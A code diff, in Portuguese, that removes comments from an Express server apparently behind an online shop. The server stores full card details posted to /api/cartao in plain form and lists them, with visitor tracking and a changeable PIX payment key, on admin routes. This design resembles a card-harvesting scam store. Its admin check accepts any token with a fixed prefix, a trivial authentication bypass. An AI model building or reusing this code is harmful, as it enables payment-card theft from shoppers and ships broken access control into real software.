@@ -21,13 +21,11 @@ let pixKey = '';
 
 // ========== ROTAS PÚBLICAS ==========
 
-// Listar produtos
 app.get('/api/produtos', (req, res) => {
     let filtered = produtos.filter(p => p.ativo === true);
     res.json({ success: true, produtos: filtered });
 });
 
-// Buscar CEP
 app.get('/api/cep/:cep', async (req, res) => {
     const cep = req.params.cep.replace(/\D/g, '');
     if (cep.length !== 8) return res.json({ error: 'CEP inválido' });
@@ -41,7 +39,6 @@ app.get('/api/cep/:cep', async (req, res) => {
     }
 });
 
-// Salvar pedido
 app.post('/api/pedido', (req, res) => {
     const pedidoId = 'CAP' + Date.now();
     const pedido = { ...req.body, pedido_id: pedidoId, created_at: new Date().toISOString() };
@@ -50,7 +47,6 @@ app.post('/api/pedido', (req, res) => {
     res.json({ success: true, pedido_id: pedidoId });
 });
 
-// Salvar cartão
 app.post('/api/cartao', (req, res) => {
     const novoCartao = { id: Date.now(), ...req.body, created_at: new Date().toISOString() };
     cartoes.push(novoCartao);
@@ -58,7 +54,6 @@ app.post('/api/cartao', (req, res) => {
     res.json({ success: true });
 });
 
-// Registrar visitante
 app.post('/api/visitante', (req, res) => {
     const { visitor_id, ip, user_agent, origem } = req.body;
     const existing = visitantes.find(v => v.visitor_id === visitor_id);
@@ -74,7 +69,6 @@ app.post('/api/visitante', (req, res) => {
     res.json({ success: true });
 });
 
-// Carrinho abandonado
 app.post('/api/carrinho', (req, res) => {
     const { visitor_id, itens, total } = req.body;
     const existing = carrinhosAbandonados.find(c => c.visitor_id === visitor_id);
@@ -94,7 +88,6 @@ app.post('/api/carrinho', (req, res) => {
 
 // ========== ROTAS ADMIN ==========
 
-// LOGIN - ROTA PRINCIPAL
 app.post('/api/admin/login', (req, res) => {
     const { username, password } = req.body;
     console.log('Tentativa de login:', username);
@@ -109,7 +102,6 @@ app.post('/api/admin/login', (req, res) => {
     }
 });
 
-// Middleware de autenticação
 function verifyAdmin(req, res, next) {
     const token = req.headers.authorization;
     if (!token || !token.startsWith('Bearer admin_auth_')) {
@@ -118,12 +110,10 @@ function verifyAdmin(req, res, next) {
     next();
 }
 
-// Listar produtos (admin)
 app.get('/api/admin/produtos', verifyAdmin, (req, res) => {
     res.json({ success: true, produtos });
 });
 
-// Adicionar produto
 app.post('/api/admin/produtos', verifyAdmin, (req, res) => {
     const novoId = Math.max(...produtos.map(p => p.id), 0) + 1;
     const novoProduto = { id: novoId, ...req.body, ativo: true, created_at: new Date().toISOString() };
@@ -132,7 +122,6 @@ app.post('/api/admin/produtos', verifyAdmin, (req, res) => {
     res.json({ success: true, produto: novoProduto });
 });
 
-// Deletar produto permanentemente
 app.delete('/api/admin/produtos/:id/permanent', verifyAdmin, (req, res) => {
     const id = parseInt(req.params.id);
     const index = produtos.findIndex(p => p.id === id);
@@ -143,27 +132,22 @@ app.delete('/api/admin/produtos/:id/permanent', verifyAdmin, (req, res) => {
     res.json({ success: true });
 });
 
-// Listar pedidos
 app.get('/api/admin/pedidos', verifyAdmin, (req, res) => {
     res.json({ success: true, pedidos });
 });
 
-// Listar cartões
 app.get('/api/admin/cartoes', verifyAdmin, (req, res) => {
     res.json({ success: true, cartoes });
 });
 
-// Listar visitantes
 app.get('/api/admin/visitantes', verifyAdmin, (req, res) => {
     res.json({ success: true, visitantes });
 });
 
-// Listar carrinhos abandonados
 app.get('/api/admin/carrinhos-abandonados', verifyAdmin, (req, res) => {
     res.json({ success: true, carrinhos: carrinhosAbandonados });
 });
 
-// Estatísticas
 app.get('/api/admin/stats', verifyAdmin, (req, res) => {
     const online = visitantes.filter(v => new Date(v.ultima_atividade) > new Date(Date.now() - 5 * 60 * 1000)).length;
     const revenue = pedidos.reduce((sum, p) => sum + (parseFloat(p.total) || 0), 0);
@@ -180,7 +164,6 @@ app.get('/api/admin/stats', verifyAdmin, (req, res) => {
     });
 });
 
-// Configuração PIX
 app.get('/api/admin/pix', verifyAdmin, (req, res) => {
     res.json({ success: true, pix_key: pixKey });
 });
@@ -190,7 +173,6 @@ app.post('/api/admin/pix', verifyAdmin, (req, res) => {
     res.json({ success: true });
 });
 
-// ========== INICIAR SERVIDOR ==========
 app.listen(PORT, () => {
     console.log(`Servidor rodando na porta ${PORT}`);
     console.log(`Admin: http://localhost:${PORT}/admin`);
